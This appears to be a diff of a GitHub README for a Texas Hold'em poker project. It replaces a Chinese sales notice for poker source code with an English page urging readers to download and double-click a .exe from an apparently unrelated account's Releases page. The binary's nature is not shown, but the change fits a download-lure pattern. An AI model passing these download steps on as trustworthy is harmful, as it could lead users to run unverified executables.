@@ -1,11 +1,53 @@
-# Texas-Hold-em-Poker-Source-Code
-德州扑克源码，德州源码，德州源代码，德州俱乐部，德州私人局，德州朋友局源码；德州撲克源碼，德州源碼，德州源代碼，德州俱樂部，德州私人局，德州朋友局源碼；联系Telegram：@xuzongbin001； 邮箱：ttpoker733@gmail.com
+# ♠️ Texas-Hold-em-Poker-Source-Code - Play Poker with Friends Easily
 
+## 📥 Download Now
+[![Download Texas-Hold-em-Poker-Source-Code](https://img.shields.io/badge/Download-Versions%20Available-brightgreen)](https://github.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/releases)
 
-![07个人中心](https://github.com/user-attachments/assets/34333683-b780-4ef5-85df-fa85b35accd8)
-![06牌局](https://github.com/user-attachments/assets/170df773-8115-40cc-902e-4315c803b21b)
-![05创建牌局](https://github.com/user-attachments/assets/38d7281b-5229-417b-a4a2-a9715e0d5a37)
-![04俱乐部](https://github.com/user-attachments/assets/10c4e689-3312-4d1d-b9ea-8bfc404abd21)
-![03大厅](https://github.com/user-attachments/assets/abda6615-dede-41e6-b42d-e2f739c39e60)
-![02大厅](https://github.com/user-attachments/assets/0ff6c987-55dc-46c3-9003-091606ff8544)
-![01登录](https://github.com/user-attachments/assets/d9f16af5-1d94-48ec-8f38-af5c8dd8124b)
+## 🚀 Getting Started
+Welcome to the Texas Hold'em Poker game! This application lets you play poker online with friends in a fun and secure way. Follow the steps below to download and run the software.
+
+## 📦 System Requirements
+To run the Texas Hold'em Poker application, ensure your system meets the following requirements:
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- At least 500 MB of free disk space.
+- A stable internet connection.
+
+## 📋 Features
+- Play Texas Hold'em Poker with up to 10 players.
+- Create private or public rooms for games.
+- Chat with other players during the game.
+- Customize game rules to suit your style.
+- AI players for practice when friends aren’t available.
+
+## 🔗 Download & Install
+To get the application, visit the Releases page. 
+
+[Visit this page to download](https://github.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/releases)
+
+### Steps to Download
+1. Go to the Releases page by clicking the link above.
+2. Look for the latest version.
+3. Click on the version number to open the details.
+4. Download the file compatible with your system, usually ending with `.exe`.
+5. Once downloaded, locate the file and double-click it to start the installation.
+6. Follow the on-screen instructions to complete the setup.
+7. After installation, open the application and start playing!
+
+## 🎮 How to Play
+1. Open the Texas Hold'em Poker application.
+2. Choose to create a new game or join an existing one.
+3. If you are creating a game, set the parameters like the number of players and rules.
+4. Invite friends by sharing the room link.
+5. Sit back and enjoy the game!
+
+## 🤝 Contact
+If you have questions, you can reach out:
+- Telegram: [@xuzongbin001](https://t.me/xuzongbin001)
+- Email: [ttpoker733@gmail.com](mailto:ttpoker733@gmail.com)
+
+## 🔄 Updates
+This application regularly receives updates. Check the Releases page for the latest improvements and features. 
+
+## 🎉 Enjoy Your Game!
+Get ready to enjoy thrilling poker sessions with your friends. Have fun, and may the best player win!
